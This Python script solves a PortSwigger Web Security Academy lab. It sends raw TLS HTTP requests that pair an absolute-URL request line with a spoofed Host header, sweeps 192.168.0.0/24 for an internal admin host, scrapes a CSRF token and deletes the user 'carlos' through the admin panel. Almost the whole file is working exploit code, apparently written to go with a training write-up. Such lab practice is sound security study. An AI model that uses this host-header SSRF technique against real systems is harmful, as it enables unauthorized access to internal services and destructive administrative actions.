#!/usr/bin/env python3
"""
SSRF via flawed request parsing
PortSwigger Web Security Academy -- HTTP Host Header Attacks

Companion script for the writeup: 05-ssrf-via-flawed-request-parsing.md

What this does -- and why it needs raw sockets:
    This proxy validates the Host header on a plain relative-path request
    (a modified Host alone gets a flat 403). But it validates the
    request-line target when an ABSOLUTE URL is present instead, while still
    routing on the Host header regardless -- so `GET https://LAB/ HTTP/1.1`
    with `Host: 192.168.0.X` slips through as a 504 (routed, nothing there)
    rather than a 403 (blocked). httpx normalizes the request line and won't
    let you send an absolute-URL request line with an independently-set Host
    header, so this script builds those raw HTTP/1.1 request bytes by hand
    over a TLS socket for every request in this lab, including the /24 sweep.

Usage:
    python 05-ssrf-via-flawed-request-parsing.py <lab-url>
    e.g. python 05-ssrf-via-flawed-request-parsing.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
from concurrent.futures import ThreadPoolExecutor
from typing import Optional
from urllib.parse import urlparse

import httpx


def _raw_abs_url_request(
    target_host: str,
    host_header: str,
    path: str = "/",
    method: str = "GET",
    body: str = "",
    cookies: str = "",
    timeout: int = 8,
) -> tuple[int, str]:
    """Send GET https://target_host/path HTTP/1.1 with an independently-set Host header."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        sock = socket.create_connection((target_host, 443), timeout=timeout)
        ssock = ctx.wrap_socket(sock, server_hostname=target_host)

        req = f"{method} https://{target_host}{path} HTTP/1.1\r\nHost: {host_header}\r\n"
        if cookies:
            req += f"Cookie: {cookies}\r\n"
        if body:
            req += "Content-Type: application/x-www-form-urlencoded\r\n"
            req += f"Content-Length: {len(body)}\r\n"
        req += "Connection: close\r\n\r\n"
        if body:
            req += body

        ssock.sendall(req.encode())
        response = b""
        while True:
            data = ssock.recv(4096)
            if not data:
                break
            response += data
        ssock.close()
        resp_str = response.decode("utf-8", errors="replace")
        parts = resp_str.split("\r\n")[0].split()
        status_code = int(parts[1]) if len(parts) > 1 else 0
        return status_code, resp_str
    except Exception:
        return 0, ""


def solve(lab_url: str) -> None:
    target_host = urlparse(lab_url).hostname

    print("[*] Getting session cookies from a normal homepage visit...")
    client = httpx.Client(verify=False, timeout=10)
    client.get(lab_url)
    cookies = dict(client.cookies)
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
    print(f"[*] Cookies: {list(cookies.keys())}")

    print("[*] Scanning 192.168.0.0/24 with absolute-URL SSRF (20 concurrent workers)...")

    def try_ip(octet: int) -> Optional[str]:
        ip = f"192.168.0.{octet}"
        code, _ = _raw_abs_url_request(target_host, ip, path="/", cookies=cookie_str)
        # 504 = routed, nothing there; 403/0 = blocked or errored. Anything else = live backend.
        if code not in (504, 0, 403):
            print(f"  [+] Hit: {ip} -> {code}")
            return ip
        return None

    found = None
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(try_ip, i): i for i in range(0, 256)}
        for future in futures:
            result = future.result()
            if result:
                found = result

    if not found:
        print("[-] No internal host responded in 192.168.0.0/24.")
        return
    print(f"[+] Internal admin host: {found}")

    print("[*] Accessing /admin via absolute-URL SSRF...")
    code, resp = _raw_abs_url_request(target_host, found, path="/admin", cookies=cookie_str)
    print(f"[*] /admin status: {code}")

    csrf_m = re.search(r'name="csrf"\s+value="([^"]+)"', resp)
    csrf = csrf_m.group(1) if csrf_m else ""
    if not csrf:
        print("[-] No CSRF token found on the admin panel.")
        return
    print(f"[*] CSRF: {csrf[:20]}...")

    new_sess = re.search(r"Set-Cookie:\s*session=([^;\r\n]+)", resp)
    if new_sess:
        cookies["session"] = new_sess.group(1)
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

    print("[*] Deleting carlos...")
    body = f"csrf={csrf}&username=carlos"
    code, resp = _raw_abs_url_request(
        target_host, found, path="/admin/delete", method="POST", body=body, cookies=cookie_str,
    )
    print(f"[*] Delete status: {code}")

    if code == 302 or "Congratulations" in resp:
        print("[+] Lab solved -- carlos deleted via absolute-URL SSRF.")
    else:
        check = client.get(lab_url)
        if "Congratulations" in check.text:
            print("[+] Lab solved -- carlos deleted via absolute-URL SSRF.")
        else:
            print("[-] Not solved yet -- inspect the delete response.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
